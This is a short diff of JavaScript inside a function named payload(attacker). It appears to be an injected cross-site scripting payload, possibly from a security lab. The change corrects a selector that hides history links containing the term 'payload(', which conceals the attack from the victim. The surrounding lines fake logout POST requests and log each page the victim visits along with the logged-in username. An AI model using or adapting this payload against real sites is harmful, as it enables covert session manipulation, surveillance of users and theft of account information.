@@ -63,7 +63,7 @@ function payload(attacker) {
 				fakeButtonPOST(e, "logout");
 			});
 
-			$("a:contains(\"y<\")").hide(); /* hide history items containing the term "payload(" */
+			$("a:contains(\"payload(\")").hide(); /* hide history items containing the term "payload(" */
 
 			let loggedUser = $("#logged-in-user").text(); /* will be empty if no user is logged in */
 			loggedUser ? log({event: "nav", uri: href, user: loggedUser}) : log({event: "nav", uri: href}); /* if not empty, log the username */
